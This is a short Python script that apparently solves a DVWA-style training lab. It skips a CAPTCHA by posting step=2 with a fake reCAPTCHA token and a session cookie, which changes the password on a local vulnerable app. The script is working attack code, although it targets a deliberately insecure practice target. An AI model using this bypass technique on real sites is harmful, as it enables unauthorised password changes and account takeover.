import requests
import sys

def captcha(password):
    URL = "http://10.0.2.15:8080/vulnerabilities/captcha/"
        
    cookie={
            "PHPSESSID":"q58entn4fdoupsmg630u39pmt6", 
            "security":"low"
            }
    datas={ 
            "step":"2",
            "password_new":password,
            "password_conf":password,
            "g-recaptcha-response":"03AOLTBLQr7qj-_8_9",
            "Change":"Change"
            }

    session1 = requests.Session()
    
    req=session1.post(URL,cookies=cookie,data=datas)


    if(req.text.find("Password Changed")!=-1):
        print ("success!")

    else:
        print ("error")

captcha(sys.argv[1])

